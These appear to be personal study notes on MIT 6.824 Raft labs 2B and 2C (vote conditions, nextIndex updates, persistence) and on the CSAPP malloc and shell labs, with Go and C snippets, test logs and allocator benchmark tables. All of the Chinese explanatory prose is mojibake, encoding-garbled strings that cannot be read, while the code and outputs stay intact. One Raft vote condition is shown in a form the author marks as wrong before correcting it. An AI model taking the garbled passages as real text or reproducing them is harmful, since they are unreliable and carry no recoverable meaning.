2021/05/20 12:28:43 0: Vote to 1
2021/05/20 12:28:43 0: recieve the candidates' request for vote
2021/05/20 12:28:44 1: Eletion Timeout, start election
2021/05/20 12:28:44 0: Vote to 1
2021/05/20 12:28:44 4: Vote to 1
2021/05/20 12:28:44 2: refuese vote to 1, because has voted-&gt;3.
2021/05/20 12:28:44 0: recieve the candidates' request for vote
2021/05/20 12:28:44 4: recieve the candidates' request for vote
2021/05/20 12:28:44 1: Become Leader
</code></pre>
<p>æŠŠå¿ƒè·³æ¥æ”¶åˆ°é«˜Termçš„å›å¤åçš„é€šçŸ¥ç®¡é“æ”¹ä¸ºæœ‰ç¼“å†²çš„äº†ï¼ŒåŒæ—¶æ¯”è¾ƒTermçš„æ—¶å€™ç”¨leaderçš„termç¼“å­˜æ¥æ¯”è¾ƒ</p>
<h3 id="testconcurrentstarts2b-failed"><a class="header" href="#testconcurrentstarts2b-failed">TestConcurrentStarts2B Failed</a></h3>
<p>è²Œä¼¼å‡ºç°æ­»é”ï¼Œå…¶å®æ˜¯matchIndexä¸€ç›´ä¸æ›´æ–°ï¼Œå¯¼è‡´æ— æ³•Leaderæ— æ³•è·Ÿæ–°commitIndex<br />
åŸå› ï¼šnextIndexçš„æ›´æ–°æ–¹å¼</p>
<pre><code class="language-go">if reply.Success {
    // rf.matchIndex[server] = rf.nextIndex[server]
    rf.nextIndex[server] += len(args.Entries)
    rf.matchIndex[server] = rf.nextIndex[server] - 1
    // ...
}
</code></pre>
<h3 id="testrejoin2b-failed"><a class="header" href="#testrejoin2b-failed">TestRejoin2B Failed</a></h3>
<p>åœ¨ä¸¤ä¸ªæ—¥å¿—ä¸ä¸€æ ·çš„serveré€‰ä¸¾çš„æ—¶å€™å‡ºç°é—®é¢˜ï¼Œæ— æ³•é€‰å‡ºleader</p>
<p>ä¿®æ”¹RequestVote RPC handlerçš„æŠ•ç¥¨åŒæ„æ¡ä»¶ï¼ˆæ³¨æ„å…¶å®è¿™é‡Œé”™äº†ï¼Œlogçš„termç›¸ç­‰çš„æ—¶å€™ä¸èƒ½ä¿è¯æ˜¯ä¸€æ ·æ–°çš„ï¼Œæ‰€ä»¥æ­¤å¤„çš„&lt;=åº”è¯¥æ˜¯&lt;ï¼‰</p>
<pre><code class="language-go">if rf.log[curLogIndex].Term &lt;= args.LastLogTerm || (args.LastLogTerm == rf.log[curLogIndex].Term &amp;&amp; args.LastLogIndex &gt;= curLogIndex) { } // candidatesçš„logè‡³å°‘å’Œæˆ‘ä¸€æ ·æ–°
</code></pre>
<p>é‡åˆ°é—®é¢˜ï¼šåœ¨TestFailAgree2Bä¸­ï¼Œå‘ç°ä¼šä»…ä»…æ ¹æ®termæŠ•ç¥¨ç»™candidateï¼Œå¯¼è‡´æµ‹è¯•ä¸é€šè¿‡</p>
<p>å†æ¬¡ä¿®æ”¹æŠ•ç¥¨åŒæ„æ¡ä»¶ï¼Œåªæœ‰args.LastLogTermæ¯”å½“å‰èŠ‚ç‚¹å¤§çš„æ—¶å€™æ‰è®¤ä¸ºæ¯”å½“å‰çš„logæ–°</p>
<pre><code class="language-go">curLogIndex := len(rf.log) - 1
if rf.log[curLogIndex].Term &lt; args.LastLogTerm || (args.LastLogTerm == rf.log[curLogIndex].Term &amp;&amp; args.LastLogIndex &gt;= curLogIndex) {} // candidatesçš„logè‡³å°‘å’Œæˆ‘ä¸€æ ·æ–°
</code></pre>
<h3 id="testbackup2b-failed"><a class="header" href="#testbackup2b-failed">TestBackup2B Failed</a></h3>
<p>å‘ç°åŒ…å«å†²çªçš„æ—¥å¿—çš„3ä¸ªserverä¸èƒ½é€‰ä¸¾å‡ºleaderï¼Œå› ä¸ºtermçš„ä¸åŒ¹é…<br />
åŸå› ï¼šåœ¨é€‰ä¸¾æ—¶å¿˜è®°æ›´æ–°term</p>
<pre><code class="language-go">go func(server int) {
	reply := RequestVoteReply{}
	if ok := rf.sendRequestVote(server, &amp;args, &amp;reply); ok {
		if reply.VoteGranted {
			voteMu.Lock()
			voteCount++
			if !notified &amp;&amp; voteCount &gt;= len(rf.peers) / 2 {
				voteOk &lt;- struct{}{}
				notified = true  // å…¶ä»–çš„é€‰ç¥¨å°±ä¸å†é€šçŸ¥äº†
				voteMu.Unlock()
			} else {
				voteMu.Unlock()
			}
		} else {
			if reply.Term &gt; leaderCurrentTerm {
				rf.mu.Lock()
				rf.currentTerm = reply.Term
				rf.mu.Unlock()
			}
		}
	}
}(serverID)
</code></pre>
<p>æœ€ç»ˆé€šè¿‡æ‰€æœ‰çš„æµ‹è¯•ï¼š</p>
<pre><code class="language-txt">$ time go test -run 2B
Test (2B): basic agreement ...
  ... Passed --   1.6  3   16    4434    3
Test (2B): RPC byte count ...
  ... Passed --   4.9  3   48  114046   11
Test (2B): agreement despite follower disconnection ...
  ... Passed --   9.0  3   78   19452    8
Test (2B): no agreement if too many followers disconnect ...
  ... Passed --   5.4  5  116   26368    4
Test (2B): concurrent Start()s ...
  ... Passed --   2.2  3   14    3906    6
Test (2B): rejoin of partitioned leader ...
  ... Passed --   8.1  3  120   28561    4
Test (2B): leader backs up quickly over incorrect follower logs ...
  ... Passed --  50.0  5 1968 1587150  102
Test (2B): RPC counts aren't too high ...
  ... Passed --   2.8  3   26    7518   12
PASS
ok  	_/Users/sjy/develop/Go/6.824/src/raft	84.752s
go test -run 2B  2.30s user 1.47s system 4% cpu 1:25.09 total
</code></pre>
<h2 id="lab2c-log-persistence"><a class="header" href="#lab2c-log-persistence">Lab2C Log Persistence</a></h2>
<p>å°†raftèŠ‚ç‚¹çš„éƒ¨åˆ†ä¿¡æ¯æŒä¹…åŒ–åˆ°â€œdiskâ€ä¸Šï¼ˆå…¶å®æ˜¯persisterï¼‰</p>
<p>åœ¨labgobçš„ä½¿ç”¨ä¸­ï¼Œéœ€è¦æ³¨å†ŒæŒä¹…åŒ–æ•°æ®çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œç”±äºæˆ‘çš„æ—¥å¿—æ¡ç›®çš„ç¬¬ä¸€æ¡å†…å®¹æ˜¯ä¸ªç©ºçš„structï¼Œæ‰€ä»¥éœ€è¦æ³¨å†Œè¿™ä¸ªç±»å‹ã€‚</p>
<p>è™½ç„¶é€šè¿‡äº†2Bï¼Œä½†è¿˜æœ‰æƒ…å†µé€‰ä¸å‡ºæ¥leaderï¼Œåœ¨æµ‹è¯•2Cçš„è¿‡ç¨‹ä¸­å‘ç°äº†ã€‚å‚è€ƒäº†ä¸‹å¤§ä½¬çš„ä»£ç ï¼Œå‘ç°stepDownå‡½æ•°çš„å¦™ç”¨ã€‚ä¸»è¦æ˜¯åœ¨æ¥å—å¿ƒè·³å›å¤å’ŒæŠ•ç¥¨å›å¤æ—¶ï¼Œè¿›è¡Œå¤„ç†åˆ¤æ–­ï¼Œå¦‚æœæ”¶åˆ°äº†é«˜Termçš„å›å¤ï¼Œç›´æ¥é€€å›åˆ°followerçŠ¶æ€ï¼Œä¸å†å¤„ç†ã€‚</p>
<p>éƒ¨åˆ†å‡½æ•°ä¿®æ”¹åï¼Œé€šè¿‡äº†æµ‹è¯•ï¼Œä»£ç åœ¨<a href="https://gitee.com/sugarcoder/mit6.824/tree/raft/">è¿™é‡Œ</a></p>
<pre><code class="language-txt">$ go test -run 2C
Test (2C): basic persistence ...
labgob warning: Decoding into a non-default variable/field int may not work
  ... Passed --   6.5  3  182   37778    6
Test (2C): more persistence ...
  ... Passed --  23.5  5  652  139412   16
Test (2C): partitioned leader and one follower crash, leader restarts ...
  ... Passed --   4.2  3   52   11504    4
Test (2C): Figure 8 ...
  ... Passed --  40.3  5 13452 2786455   15
Test (2C): unreliable agreement ...
  ... Passed --  11.0  5  216   72284  246
Test (2C): Figure 8 (unreliable) ...
  ... Passed --  40.8  5 1728 5864070  933
Test (2C): churn ...
  ... Passed --  16.3  5  700  441128  130
Test (2C): unreliable churn ...
  ... Passed --  16.5  5  332  117614  123
PASS
ok  	_/6.824/src/raft	159.471s
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---malloc-lab"><a class="header" href="#csapp---malloc-lab">CSAPP - malloc Lab</a></h1>
<p>å®ç°ä¸€ä¸ªç©ºé—´åˆ†é…å™¨</p>
<h2 id="éšå¼ç©ºé—²é“¾è¡¨"><a class="header" href="#éšå¼ç©ºé—²é“¾è¡¨">éšå¼ç©ºé—²é“¾è¡¨</a></h2>
<p>æŒ‰ç…§ä¹¦ä¸­ç¬¬ä¹ç« è™šæ‹Ÿå†…å­˜çš„éšå¼ç©ºé—²é“¾è¡¨ï¼ˆå¸¦è¾¹ç•Œæ ‡è®°çš„ï¼‰è¿›è¡Œè®¾è®¡ã€‚æŸ¥æ‰¾ç©ºé—²å—çš„æ–¹æ³•æ˜¯é¦–æ¬¡é€‚é…ç®—æ³•ã€‚å…¶ä»–çš„å®å®šä¹‰å’Œå‡½æ•°ä¸è¯¾æœ¬ä¸Šä¸€è‡´ã€‚</p>
<p>åœ¨å®éªŒå®˜ç½‘ä¸Šæ²¡æœ‰ç»™å‡ºtracesçš„æ–‡ä»¶å¤¹ï¼Œä»<a href="https://github.com/lsw8075/malloc-lab">github</a>ä¸Šæ‰¾åˆ°å¹¶ä½¿ç”¨svnä¸‹è½½tracesæ–‡ä»¶å¤¹ã€‚</p>
<p>é¦–æ¬¡é€‚é…çš„ç®—æ³•</p>
<pre><code class="language-c">// First fit algorithm
static void *find_fit(size_t asize) {
    void *bp;
    for (bp = heap_listp; GET_SIZE(HDRP(bp)) != 0; bp = NEXT_BLKP(bp)) {
        if (!GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) {
            return bp;
        }
    }
    return NULL;
}


static void place(void *bp, size_t asize) {
    size_t blk_size = GET_SIZE(HDRP(bp));
    size_t remain_size = blk_size - asize;
    size_t should_split = (remain_size &gt;= 2 * DSIZE); // å‰©ä½™éƒ¨åˆ†å¤§äºæˆ–ç­‰äºæœ€å°å—(4+4+1 =&gt; 16 bytes)çš„å¤§å°æ—¶è¿›è¡Œåˆ†å‰²

    if (should_split) {
        PUT(HDRP(bp), PACK(asize, 1));
        PUT(FTRP(bp), PACK(asize, 1));
        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, 0));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, 0));
    } else {
        PUT(HDRP(bp), PACK(blk_size, 1));
        PUT(FTRP(bp), PACK(blk_size, 1));
    }
}
</code></pre>
<p>mm_reallocå‡½æ•°</p>
<pre><code class="language-c">/*
 * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
 */
void *mm_realloc(void *ptr, size_t size)
{
    if (!ptr) {
        return mm_malloc(size);
    }
    if (size == 0) {
        mm_free(ptr);
        return 0;
    }
    size_t old_size = GET_SIZE(HDRP(ptr));
    void* newptr = mm_malloc(size);

    if(!newptr) {
        return 0;
    }

    if (size &lt; old_size) {
        old_size = size;
    }
    memcpy(newptr, ptr, old_size);

    mm_free(ptr);

    return newptr;
}
</code></pre>
<p>æ€§èƒ½ï¼š</p>
<pre><code class="language-txt">$ ./mdriver -V -t traces
Team Name:Avenger

Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   99%    5694  0.010277   554
 1       yes   99%    5848  0.009609   609
 2       yes   99%    6648  0.015698   423
 3       yes  100%    5380  0.011530   467
 4       yes   66%   14400  0.000578 24913
 5       yes   91%    4800  0.009993   480
 6       yes   92%    4800  0.009340   514
 7       yes   55%   12000  0.124230    97
 8       yes   51%   24000  0.404152    59
 9       yes   27%   14401  0.109136   132
10       yes   34%   14401  0.003691  3902
Total          74%  112372  0.708234   159

Perf index = 44 (util) + 11 (thru) = 55/100
</code></pre>
<h2 id="æ˜¾å¼ç©ºé—²é“¾è¡¨"><a class="header" href="#æ˜¾å¼ç©ºé—²é“¾è¡¨">æ˜¾å¼ç©ºé—²é“¾è¡¨</a></h2>
<p>ä½¿ç”¨åŒå‘é“¾è¡¨è€Œä¸æ˜¯éšå¼ç©ºé—²é“¾è¡¨ï¼Œä½¿é¦–æ¬¡é€‚é…çš„åˆ†é…æ—¶é—´ä»å—æ€»æ•°çš„çº¿æ€§æ—¶é—´å‡å°‘åˆ°äº†ç©ºé—²å—æ•°é‡çš„çº¿æ€§æ—¶é—´</p>
<p>åœ¨ç©ºé—²å—ä¸­çš„å¢åŠ ä¸¤ä¸ªæŒ‡é’ˆè®°å½•predå’Œsuccï¼ŒæŒ‡å‘å‰ä¸€ä¸ªå’Œåä¸€ä¸ªç©ºé—²å—ï¼Œæ–¹ä¾¿åœ¨ä½¿ç”¨é¦–æ¬¡é€‚é…ç®—æ³•æ—¶æŸ¥æ‰¾ç©ºé—²å—ã€‚ä½†è¿™æ ·ä¹Ÿä¼šå¯¼è‡´æœ€å°å—çš„å¤§å°å¢åŠ ï¼Œå¦‚æœæ˜¯8Bytesï¼ˆåŒå­—ï¼‰å¯¹é½çš„ï¼Œæœ€å°å—ä¸º4 + 4 + 4 + 4 + 1 -&gt; 24Bytes</p>
<p>åœ¨ä¹¦ä¸­æåˆ°äº†ä¸¤ç§ç»´æŠ¤é“¾è¡¨çš„æ–¹å¼ï¼šLIFOï¼ˆåè¿›å…ˆå‡ºï¼‰é¡ºåºã€åœ°å€é¡ºåºã€‚</p>
<p>LIFOæ¯æ¬¡æŠŠæ–°é‡Šæ”¾çš„ç©ºé—²å—æ”¾ç½®åœ¨é“¾è¡¨çš„å¼€å¤´ï¼Œä½¿å¾—é‡Šæ”¾ä¸€ä¸ªå—å¯ä»¥åœ¨å¸¸æ•°æ—¶é—´å†…å®Œæˆã€‚è€ŒæŒ‰ç…§åœ°å€é¡ºåºç»„ç»‡é“¾è¡¨ï¼Œåœ¨é‡Šæ”¾æ—¶éœ€è¦æŸ¥æ‰¾åˆé€‚çš„é“¾è¡¨æ’å…¥ä½ç½®ï¼Œä½†å†…å­˜åˆ©ç”¨ç‡é«˜ã€‚</p>
<h3 id="lifoå®ç°"><a class="header" href="#lifoå®ç°">LIFOå®ç°</a></h3>
<p>å®ç°è¿‡ç¨‹ä¸­é‡åˆ°å¾ˆå¤šSegmentation faultï¼Œä¸»è¦æ˜¯æŒ‡é’ˆæ“ä½œçš„é”™è¯¯ã€‚éœ€è¦ç”¨gdbè°ƒè¯•ï¼Œåœ¨gccç¼–è¯‘æ—¶å¢åŠ -gé€‰é¡¹ï¼Œä½¿ç”¨gdbçš„backtraceå‘½ä»¤æŸ¥çœ‹æ®µé”™è¯¯æ—¶çš„è°ƒç”¨æ ˆæ¥å®šä½é”™è¯¯ã€‚</p>
<p>å®šä¹‰æ–°çš„å®æ¥å®ç°å¯¹ç©ºé—²å—çš„æŒ‡é’ˆæ“ä½œï¼Œä»¥åŠæ˜¾ç¤ºç©ºé—²é“¾è¡¨çš„å¤´æŒ‡é’ˆ</p>
<pre><code class="language-c">// æ˜¾å¼ç©ºé—²é“¾è¡¨
// Given a free block pointer bp, compute the address of pred and succeed pointer in this free block
#define PRED(bp) (bp)
#define SUCC(bp) ((char *)bp + WSIZE)
// Given a free block pointer bp, compute the address of pred-free and succeed-free blocks of bp
#define PRED_FBLKP(bp) ((char *)GET(bp))
#define SUCC_FBLKP(bp) ((char *)GET(SUCC(bp)))  // éœ€è¦è½¬æ¢æˆcharç±»å‹æŒ‡é’ˆï¼Œä¿è¯å¢åŠ çš„åœ°å€æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„
// æ˜¾å¼ç©ºé—²é“¾è¡¨
static char *free_list_head = 0;
</code></pre>
<p>ä¸¤ä¸ªå¯¹é“¾è¡¨è¿›è¡Œå¤´æ’æ³•å’Œåˆ é™¤æŒ‡å®šç©ºé—²å—çš„å‡½æ•°</p>
<pre><code class="language-c">// å¤´æ’æ³•
static void insert_head(void *new_free_bp) {
    PUT(SUCC(new_free_bp), free_list_head);
    PUT(PRED(new_free_bp), 0);
    if (free_list_head != 0) {
        PUT(PRED(free_list_head), new_free_bp);
    }
    free_list_head = new_free_bp;
}

// ä»ç©ºé—²é“¾è¡¨ä¸Šåˆ é™¤ä¸€ä¸ªç©ºé—²å—
static void remove_block(void *bp) {
    if (PRED_FBLKP(bp) == 0 &amp;&amp; SUCC_FBLKP(bp) == 0) { // å•ä¸ªå¤´èŠ‚ç‚¹
        free_list_head = 0;
    } else if (PRED_FBLKP(bp) == 0) { // bpæ˜¯å¤´èŠ‚ç‚¹
        free_list_head = SUCC_FBLKP(bp);
        PUT(PRED(SUCC_FBLKP(bp)), 0);
        PUT(PRED(bp), 0);
        PUT(SUCC(bp), 0);
    } else if (SUCC_FBLKP(bp) == 0) {
        PUT(SUCC(PRED_FBLKP(bp)), 0);
        PUT(PRED(bp), 0);
        PUT(SUCC(bp), 0);
    } else {
        PUT(SUCC(PRED_FBLKP(bp)), SUCC_FBLKP(bp));
        PUT(PRED(SUCC_FBLKP(bp)), PRED_FBLKP(bp));
        PUT(PRED(bp), 0);
        PUT(SUCC(bp), 0);
    }
}
</code></pre>
<p>æ›´æ–°åçš„å‡½æ•°ï¼ˆå…¶ä»–å‡½æ•°å’Œä¹¦æœ¬ä¸Šçš„ä¸€æ ·ï¼‰</p>
<pre><code class="language-c">int mm_init(void)
{
    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1)
        return -1;
    PUT(heap_listp, 0);  // alignment padding
    PUT(heap_listp + (1*WSIZE), PACK(DSIZE, 1)); // prologue header
    PUT(heap_listp + (2*WSIZE), PACK(DSIZE, 1)); // prologue footer
    PUT(heap_listp + (3*WSIZE), PACK(0, 1)); // Epilogue header
    heap_listp += (2 * WSIZE);

    if ((free_list_head = extend_heap(CHUNKSIZE / WSIZE)) == NULL) {
        return -1;
    }

    PUT(PRED(free_list_head), 0);
    PUT(SUCC(free_list_head), 0);
    return 0;
}

void *mm_malloc(size_t size)
{
    Dprintf(&quot;Mallocing: %lu bytes.\n&quot;, size);
    size_t asize;  // Adjusted block size
    size_t extendsize; // Amount to extend heap if no fit
    char *bp;

    if (size &lt;= 0) {
        return NULL;
    }

    if (size &lt;= DSIZE) {
        asize = 2 * DSIZE;
    } else {
        //           æœ‰æ•ˆè½½è·å¤§å°  é¦–å°¾
        asize = DSIZE * ((size + DSIZE + DSIZE-1) / DSIZE);  // åŒå­—å¯¹é½
    }

    if ((bp = find_fit(asize)) != NULL) {
        place(bp, asize);
//        mm_check(1);
        return bp;
    }

    Dprint(&quot;Not enough space, extend Heap.\n&quot;);

    extendsize = MAX(asize, CHUNKSIZE);
    if ((bp = extend_heap(extendsize/WSIZE)) == NULL) {
        return NULL;
    }
    remove_block(bp);
    place(bp, asize);

    if (DEBUG) {
        mm_check(1);
    }
    return bp;
}

static void *find_fit(size_t asize) {
    void *bp;
    for (bp = free_list_head; bp != 0; bp = SUCC_FBLKP(bp)) {
        // debug
//        print_block(bp);
        if (GET_SIZE(HDRP(bp)) &gt;= asize) {
//            printf(&quot;Find free block, remove it from list.\n&quot;);
            remove_block(bp);
            return bp;
        }
    }
    return NULL;
}


static void place(void *bp, size_t asize) {
    size_t blk_size = GET_SIZE(HDRP(bp));
    size_t remain_size = blk_size - asize;
    size_t should_split = (remain_size &gt;= 3 * DSIZE); // å‰©ä½™éƒ¨åˆ†å¤§äºæˆ–ç­‰äºæœ€å°å—(4+4+4+4+1 =&gt; 24 bytes)çš„å¤§å°æ—¶è¿›è¡Œåˆ†å‰²

    if (should_split) {
        // Important! remove the free block first, called before place()
        PUT(HDRP(bp), PACK(asize, 1));
        PUT(FTRP(bp), PACK(asize, 1));
        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, 0));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, 0));
        // insert the new free block to head
        void* new_free_block = NEXT_BLKP(bp);
        PUT(PRED(new_free_block), 0);
        PUT(SUCC(new_free_block), 0);
        insert_head(new_free_block);
    } else {
        PUT(HDRP(bp), PACK(blk_size, 1));
        PUT(FTRP(bp), PACK(blk_size, 1));
    }
}
static void *coalesce(void *bp) {
    size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));
    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));
    size_t size = GET_SIZE(HDRP(bp));

    if (prev_alloc &amp;&amp; next_alloc) {
        Dprint(&quot;single block coalesce.\n&quot;);
        insert_head(bp);
        return bp;
    } else if(prev_alloc &amp;&amp; !next_alloc) {
        Dprint(&quot;Next block is free\n&quot;);
        remove_block(NEXT_BLKP(bp));
        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));
        PUT(HDRP(bp), PACK(size, 0));
        PUT(FTRP(bp), PACK(size, 0));
        insert_head(bp);
    } else if (!prev_alloc &amp;&amp; next_alloc) {
        Dprint(&quot;Prev block is free\n&quot;);
        remove_block(PREV_BLKP(bp));
        size += GET_SIZE(HDRP(PREV_BLKP(bp)));
        PUT(FTRP(bp), PACK(size, 0));
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));
        bp = PREV_BLKP(bp);
        insert_head(bp);
    } else {
        remove_block(PREV_BLKP(bp));
        remove_block(NEXT_BLKP(bp));
        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +
                GET_SIZE(HDRP(NEXT_BLKP(bp)));
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));
        bp = PREV_BLKP(bp);
        insert_head(bp);
    }
    Dprint(&quot;\nAfter coalease.\n&quot;);
    if (DEBUG) {
        mm_check(1);
    }
    return bp;
}
</code></pre>
<p>æµ‹è¯•æ€§èƒ½ï¼Œå¯ä»¥çœ‹åˆ°å¯¹æ¯”ä¹‹å‰çš„éšå¼é“¾è¡¨æœ‰å¾ˆå¤§çš„æ€§èƒ½æå‡</p>
<pre><code class="language-txt">$ ./mdriver -V -t traces
Team Name:Avenger

Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   89%    5694  0.000274 20773
 1       yes   92%    5848  0.000195 30005
 2       yes   94%    6648  0.000377 17629
 3       yes   96%    5380  0.000300 17957
 4       yes   66%   14400  0.000225 64028
 5       yes   87%    4800  0.000595  8067
 6       yes   85%    4800  0.000602  7976
 7       yes   55%   12000  0.003013  3983
 8       yes   51%   24000  0.003050  7868
 9       yes   26%   14401  0.122659   117
10       yes   34%   14401  0.003157  4562
Total          70%  112372  0.134446   836

Perf index = 42 (util) + 40 (thru) = 82/100
</code></pre>
<h3 id="åœ°å€é¡ºåºç»„ç»‡å®ç°"><a class="header" href="#åœ°å€é¡ºåºç»„ç»‡å®ç°">åœ°å€é¡ºåºç»„ç»‡å®ç°</a></h3>
<p>ä¸ºäº†æå‡å†…å­˜åˆ©ç”¨ç‡ï¼Œä½¿ç”¨æŒ‰ç…§åœ°å€é¡ºåºæ¥ç»„ç»‡ç©ºé—²é“¾è¡¨çš„æ’åºã€‚ä»˜å‡ºçš„ä»£ä»·æ˜¯é‡Šæ”¾ä¸€ä¸ªå—æ—¶çš„çº¿æ€§æœç´¢æ—¶é—´ä»£ä»·ã€‚</p>
<p>å¢åŠ äº†ä¸€ä¸ªinsert_orderlyçš„å‡½æ•°ï¼Œä¹‹åå°†LIFOå®ç°ä¸­çš„insert_blockéƒ½æ›¿æ¢ä¸ºinsert_orderlyå‡½æ•°ã€‚</p>
<pre><code class="language-c">static void insert_orderly(void *new_free_bp) {
    if (free_list_head == 0) {
        PUT(PRED(new_free_bp), 0);
        PUT(SUCC(new_free_bp), 0);
        free_list_head = new_free_bp;
        return;
    }
    void *bp, *tail;
    for (bp = free_list_head; bp != 0; tail = bp, bp = SUCC_FBLKP(bp)) {
        if (new_free_bp &lt; bp) {
            if (PRED_FBLKP(bp)) { // æœ‰å‰ç¼€å—
                PUT(SUCC(PRED_FBLKP(bp)), new_free_bp);
            } else {
                free_list_head = new_free_bp;
            }
            PUT(PRED(new_free_bp), PRED_FBLKP(bp));
            PUT(PRED(bp), new_free_bp);
            PUT(SUCC(new_free_bp), bp);
            return;
        }
    }
    PUT(SUCC(tail), new_free_bp);
    PUT(PRED(new_free_bp), tail);
    PUT(SUCC(new_free_bp), 0);
}
</code></pre>
<p>æ—¶é—´æ€§èƒ½ä¸‹é™äº†éå¸¸å¤šï¼Œä¹Ÿå¯èƒ½æ˜¯coalesceå‡½æ•°ä¸­çš„æ’å…¥æŸ¥æ‰¾æ¬¡æ•°è¿‡å¤š</p>
<pre><code class="language-txt">Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   99%    5694  0.000267 21342
 1       yes   99%    5848  0.000226 25899
 2       yes   99%    6648  0.000314 21145
 3       yes   99%    5380  0.000286 18785
 4       yes   66%   14400  0.000227 63464
 5       yes   91%    4800  0.004698  1022
 6       yes   92%    4800  0.004342  1106
 7       yes   55%   12000  0.060981   197
 8       yes   51%   24000  0.231590   104
 9       yes   27%   14401  0.152743    94
10       yes   34%   14401  0.003200  4500
Total          74%  112372  0.458874   245

Perf index = 44 (util) + 16 (thru) = 61/100
</code></pre>
<p>todo:æ”¹è¿›</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---shell-lab"><a class="header" href="#csapp---shell-lab">CSAPP - Shell Lab</a></h1>
<p>å†™ä¸€ä¸ªæ¨¡æ‹ŸUnix Shellçš„Tiny Shellç¨‹åº</p>
<p>åŒ…æ‹¬å†…ç½®å‘½ä»¤çš„å¤„ç†ã€ä¿¡å·å¤„ç†ã€ä½œä¸šç®¡ç†çš„æŠ€æœ¯</p>
<p>ä¸€äº›ç”¨äºå­—ç¬¦ä¸²å¤„ç†çš„Cå‡½æ•°</p>
<pre><code class="language-c">charÂ *strchr(Â constÂ charÂ *str,Â intÂ chÂ );
</code></pre>
<p>è¿”å›chåœ¨strä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰ï¼Œè¿”å›NULL</p>
<p>æ³¨æ„åœ¨åŸå§‹ç¨‹åºä¸­æ³¨å†Œäº†SIGINTä¿¡å·çš„å¤„ç†ï¼Œéœ€è¦å®ç°ï¼Œå¦åˆ™ç”¨ctrl+cåœæ­¢ä¸äº†ï¼ˆåªèƒ½ç”¨kill -9ï¼‰</p>
<h2 id="ä¿¡å·"><a class="header" href="#ä¿¡å·">ä¿¡å·</a></h2>
<ul>
<li>SIGCONTï¼šç»§ç»­è¿›ç¨‹å¦‚æœè¯¥è¿›ç¨‹å¤„äºåœæ­¢çŠ¶æ€</li>
<li>SIGTSTPï¼šæ¥è‡ªç»ˆç«¯çš„åœæ­¢ä¿¡å·</li>
<li>SIGINTï¼šæ¥è‡ªé”®ç›˜çš„ä¸­æ–­ï¼ˆctrl+cï¼‰</li>
</ul>
<p>å†…æ ¸ä¸ºæ¯ä¸ªè¿›ç¨‹å†pendingä½å‘é‡ä¸­ç»´æŠ¤ç€å¾…å¤„ç†ä¿¡å·çš„é›†åˆï¼Œblockedä½å‘é‡ä¸­ç»´æŠ¤ç€è¢«é˜»å¡çš„ä¿¡å·é›†åˆã€‚åªè¦ä¼ é€äº†ä¸€ä¸ªç±»å‹ä¸ºkçš„ä¿¡å·ï¼Œå†…æ ¸å°±ä¼šè®¾ç½®pendingä¸­ç¬¬kä½ï¼Œè€Œåªè¦æ¥å—äº†ä¸€ä¸ªç±»å‹ä¸ºkçš„ä¿¡å·ï¼Œå†…æ ¸å°±ä¼šæ¸…æ¥špendingä¸­çš„ç¬¬kä½ã€‚</p>
<p>å½“å†…æ ¸æŠŠè¿›ç¨‹pä»å†…æ ¸æ¨¡å¼åˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥è¿›ç¨‹pçš„æœªè¢«é˜»å¡çš„å¾…å¤„ç†ä¿¡å·çš„é›†åˆï¼ˆpending &amp; ~blocked)ã€‚å¦‚æœè¯¥é›†åˆéç©ºï¼Œå†…æ ¸ä¼šé€‰æ‹©é›†åˆä¸­çš„æŸä¸ªä¿¡å·kï¼ˆé€šå¸¸æ˜¯æœ€å°çš„kï¼‰ï¼Œå¹¶ä¸”å¼ºåˆ¶pæ¥å—ä¿¡å·kã€‚</p>
<h2 id="è¿›ç¨‹åŒæ­¥"><a class="header" href="#è¿›ç¨‹åŒæ­¥">è¿›ç¨‹åŒæ­¥</a></h2>
<p>ç”±äºtshä¸­çš„å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹æ˜¯å¹¶å‘æ‰§è¡Œçš„ï¼Œæ¯æ¬¡å¢åŠ ä¸€ä¸ªåå°ä½œä¸šï¼Œéœ€è¦addjobï¼Œä¸ºäº†é˜²æ­¢addjobåœ¨deletejobä¹‹åè¿è¡Œï¼Œéœ€è¦é€šè¿‡è®¾ç½®blockedä½å‘é‡å¯¹ä¿¡å·çš„æ¥æ”¶è¿›è¡ŒåŒæ­¥ï¼ˆsigprocmaskï¼‰ã€‚</p>
<p>åˆ©ç”¨æ˜¾å¼çš„é˜»å¡ä¿¡å·(SIGCHLD)ï¼Œå®ç°åŸå­æ“ä½œï¼ˆå¢å‡ä»»åŠ¡åˆ—è¡¨ï¼‰</p>
<h2 id="ctrlcæ€æ­»å‰å°è¿›ç¨‹"><a class="header" href="#ctrlcæ€æ­»å‰å°è¿›ç¨‹">ctrl+cæ€æ­»å‰å°è¿›ç¨‹</a></h2>
